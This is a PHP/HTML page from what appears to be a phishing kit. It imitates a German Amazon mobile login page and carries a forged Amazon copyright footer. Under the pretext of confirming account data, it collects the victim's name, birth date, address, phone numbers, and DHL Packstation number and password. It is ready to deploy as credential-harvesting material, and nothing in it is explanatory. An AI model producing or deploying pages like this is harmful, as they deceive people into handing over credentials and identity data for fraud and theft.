<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ember a-transition a-transform a-opacity a-border-image a-border-radius a-box-shadow a-text-stroke a-text-shadow a-mobile a-ios a-touch-scrolling a-transform3d a-gradients a-local-storage a-textarea-placeholder a-input-placeholder a-autofocus a-webworker a-history a-drag-drop a-svg a-canvas a-video a-audio a-js a-touch a-mobile a-ws a-audio a-video a-canvas a-svg a-drag-drop a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-ios a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-19ax5a9jf="mongoose" data-aui-build-date="3.17.5.1-2017-04-11">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<title><?php echo $title ?></title>
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
		<link rel="stylesheet" href="src/css/51DPEdT1dL.css">
		<link rel="stylesheet" href="src/css/AuthenticationPortalAssets-00b5524f401f34fc3868ad90d4aa679bf.css">
		<link href="src/img/favicon.ico" rel="shortcut icon" />
		<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
		<script type="text/javascript">
			$(document).ready(function() {
				$( "#packstation" ).click(function() { 
					if ($("#packstation" ).is( ":checked" )) {
						$("#ps_image").css("display", "block");
						$("#ps_nummer").css("display", "block");
						$("#ps_passwort").css("display", "block");
						$("#ps_active").val("1");
					} else {
						$("#ps_image").css("display", "none");
						$("#ps_nummer").css("display", "none");
						$("#ps_passwort").css("display", "none");
						$("#ps_active").val("0");
					}
				});
			});
		</script>
	</head>

  <body class="a-color-offset-background  ap-locale-de_DE a-m-de a-aui_51744-c a-aui_57326-c a-aui_72554-c a-aui_83815-c a-aui_86171-c a-aui_96511-t1 a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_noopener_84118-t1 a-aui_ux_102912-c a-aui_ux_59374-c a-aui_ux_60000-c a-aui_ux_92006-t1 a-aui_ux_98513-c a-dex_92889-c auth-show-password-enabled auth-show-password-engaged auth-show-password-ready" style="">
		<div id="a-page">
			<div class="a-section a-spacing-none">
				<link rel="stylesheet" href="src/css/51b-EJ2JOWL.css">
				<style type="text/css">
					<!--
					.nav-sprite-v3 .nav-sprite {
					background-image: url(src/img/sky_webnav_V1_sprite_1x._CB508122268_.png);
					background-repeat: no-repeat;
					}
					.nav-spinner {
					background-image: url(src/img/snake._CB192194539_.gif);
					}
					-->
				</style>

				<header class="nav-mobile nav-locale-de nav-lang-de nav-ssl nav-unrec nav-blueheaven">
					<div id="navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3">
						<div id="nav-logobar">
							<div class="nav-left">
								<div id="nav-logo">
									<a href="#" class="nav-logo-link" tabindex="">
										<span class="nav-logo-base nav-sprite"></span>
										<span class="nav-logo-ext nav-sprite"></span>
										<span class="nav-logo-locale nav-sprite"></span>
									</a>
								</div>
							</div>
							<div class="nav-right"></div>
						</div>
					</div>
				</header>
			</div>

			<div class="a-container">
				<div class="a-section a-spacing-none"></div>
				<div class="a-section a-spacing-none auth-pagelet-mobile-container"></div>

				<div class="a-section auth-pagelet-mobile-container">

					<div id="auth-alert-window" class="a-box a-alert a-alert-error" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
						<div class="a-box-inner a-alert-container">
							<h4 class="a-alert-heading">Ein Problem ist aufgetreten:</h4>
							<div class="a-alert-content">
								<ul class="a-unordered-list a-vertical auth-error-messages" role="alert">
									<li id="auth-email-missing-alert" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
										<span class="a-list-item">
											<?php
												if (isset($_SESSION['errList'])) {
													for ($i = 0; $i < count($_SESSION['errList']); $i++) {
														echo $_SESSION['errList'][$i] . '<br/>';
													}
													
													unset($_SESSION['errList']);
												}
											?>
										</span>
									</li>
								</ul>
							</div>
						</div>
					</div>

					<form name="signIn" method="post" novalidate="" action="index.php" class="auth-validate-form auth-clearable-form fwcim-form" formnovalidate>
						<input type="hidden" name="ps_active" id="ps_active" value="<?php echo ((isset($_SESSION['ps_active']) && $_SESSION['ps_active'] == 1) ? "1" : "0") ?>"/>
						
						<div class="a-row">
							<div class="a-section a-spacing-extra-large">
								<h1 class="a-spacing-small a-spacing-top-small a-text-left">
								Bestätigung persönlicher Daten
								</h1>
								<p>
									Bitte bestätigen Sie die bei uns hinterlegten persönlichen Daten wie Sie diese in Ihrem Konto eingegeben haben.
								</p>
							</div>
						</div>

						<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
							<label class="a-form-label auth-mobile-label">
								Vorname
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="vorname" name="vorname" placeholder="Vorname" value="<?php echo (isset($_SESSION['vorname']) ? $_SESSION['vorname'] : ""); ?>" maxlength="30" type="text">
							</div>
							
							<label class="a-form-label auth-mobile-label">
								Nachname
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="nachname" name="nachname" placeholder="Nachname" value="<?php echo (isset($_SESSION['nachname']) ? $_SESSION['nachname'] : ""); ?>" maxlength="30" type="text">
							</div>
							
							<label class="a-form-label auth-mobile-label">
								Geburtsdatum
							</label>
							
							
							<?php
								echo '<select style="margin-top:5px;margin-bottom:5px;border:1px solid #a6a6a6;width:125px;padding:4px;border-top-color: #949494" id="dob1" name="dob1"><option value="Tag">Tag</option>';
								
								for ($i = 1; $i <= 31; $i++) {
									if (isset($_SESSION['dob1'])) {
										if ($i == $_SESSION['dob1']) {
											echo '<option selected value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
										} else {
											echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
										}
									} else {
										echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
									}
								}
								echo '</select>';
							?>
							
							&nbsp;
							
							<?php
								echo '<select style="border:1px solid #a6a6a6;width:125px;padding:4px;border-top-color: #949494" id="dob2" name="dob2"><option value="Monat">Monat</option>';
								
								for ($i = 1; $i <= 12; $i++) {
									if (isset($_SESSION['dob2'])) {
										if ($i == $_SESSION['dob2']) {
											echo '<option selected value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
										} else {
											echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
										}
									} else {
										echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
									}
								}
								echo '</select>';
							?>
							
							&nbsp;
							
							<?php
								echo '<select style="border:1px solid #a6a6a6;width:125px;padding:4px;border-top-color: #949494" id="dob3" name="dob3"><option value="Jahr">Jahr</option>';
							
								$year = date("Y");
								for ($i = $year - 18; $i >= $year - 100; $i--) {
									if (isset($_SESSION['dob3'])) {
										if ($i == $_SESSION['dob3']) {
											echo '<option selected value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
										} else {
											echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
										}
									} else {
										echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
									}
								}
								echo '</select>';
							?>
							
							<label class="a-form-label auth-mobile-label">
								Anschrift (Straße & Hausnummer)
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="adresse" name="adresse" placeholder="Anschrift (Straße & Hausnummer)" value="<?php echo (isset($_SESSION['adresse']) ? $_SESSION['adresse'] : ""); ?>" maxlength="30" type="text">
							</div>
							
							<label class="a-form-label auth-mobile-label">
								Postleitzahl
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="plz" name="plz" placeholder="Postleitzahl" value="<?php echo (isset($_SESSION['plz']) ? $_SESSION['plz'] : ""); ?>" maxlength="5" type="text">
							</div>
							
							<label class="a-form-label auth-mobile-label">
								Wohnort
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="ort" name="ort" placeholder="Wohnort" value="<?php echo (isset($_SESSION['ort']) ? $_SESSION['ort'] : ""); ?>" maxlength="35" type="text">
							</div>
							
							<label class="a-form-label auth-mobile-label">
								Festnetznummer
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="tlfnr" name="tlfnr" placeholder="Festnetznummer" value="<?php echo (isset($_SESSION['tlfnr']) ? $_SESSION['tlfnr'] : ""); ?>" maxlength="35" type="text">
							</div>
							
							<label class="a-form-label auth-mobile-label">
								Mobilfunknummer
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="handynr" name="handynr" placeholder="Mobilfunknummer" value="<?php echo (isset($_SESSION['handynr']) ? $_SESSION['handynr'] : ""); ?>" maxlength="35" type="text">
							</div>
							
							<br/><hr/>
							<input type="checkbox" id="packstation" name="packstation" <?php echo ((isset($_SESSION['ps_active']) && $_SESSION['ps_active'] == 1) ? "checked" : "") ?>> Packstationdaten eingeben
							<br/><br/>
							
							<div id="ps_image" style="display:<?php echo ((isset($_SESSION['ps_active']) && $_SESSION['ps_active'] == 1) ? "block" : "none") ?>">
								<img src="src/img/paket_de.png" style="height:33px;width:260px"/><br/><br/>
							</div>
							
							<div id="ps_nummer" style="display:<?php echo ((isset($_SESSION['ps_active']) && $_SESSION['ps_active'] == 1) ? "block" : "none") ?>">
								<label class="a-form-label auth-mobile-label">
									PostNummer
								</label>
								
								<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
									<input id="ps_nr" name="ps_nr" placeholder="PostNummer" value="<?php echo (isset($_SESSION['ps_nr']) ? $_SESSION['ps_nr'] : ""); ?>" maxlength="15" type="text">
								</div>
							</div>
							
							<div id="ps_passwort" style="display:<?php echo ((isset($_SESSION['ps_active']) && $_SESSION['ps_active'] == 1) ? "block" : "none") ?>">
								<label class="a-form-label auth-mobile-label">
									Passwort
								</label>
								
								<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
									<input id="ps_pw" name="ps_pw" placeholder="Passwort" value="<?php echo (isset($_SESSION['ps_pw']) ? $_SESSION['ps_pw'] : ""); ?>" maxlength="36" type="text">
								</div>
							</div>
							
						</div>
						
						<div class="a-row"></div>

						<div class="a-section">
							<div class="a-button-stack">
								<span id="auth-signin-button" class="a-button a-spacing-extra-large a-button-span12 a-button-primary auth-share-credential-off">
									<span class="a-button-inner">
										<input id="signInSubmit" name="doPersonaldata_x" tabindex="6" class="a-button-input" aria-labelledby="auth-signin-button-announce" type="submit" formnovalidate>
										<span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
											Fortfahren
										</span>
									</span>
								</span>
								
							</div>
						</div>
					</form>
				</div>

				<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
					<div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v3">

						<div class="icp-container-mobile">
							<style type="text/css">
								#icp-touch-link-language { display: none; }
							</style>    

							<a href="#" class="icp-touch-link-2" id="icp-touch-link-language">
								<div class="icp-nav-globe-img-2 icp-mobile-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span>
							</a>

							<style type="text/css">
								#icp-touch-link-country { display: none; }
							</style>
							
							<a href="#" class="icp-touch-link-2" id="icp-touch-link-country">
								<span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span>
							</a>
						</div>

						<ul class="nav-ftr-horiz">
							<li class="nav-li"><a href="#" class="nav-a">Unsere AGB</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Datenschutzerklärung</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Impressum</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Cookies &amp; Internet-Werbung</a></li>
						</ul>
						<div id="nav-ftr-copyright">© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</div>
					</div>
				</footer>
			</div>
		</div>
	</body>
</html>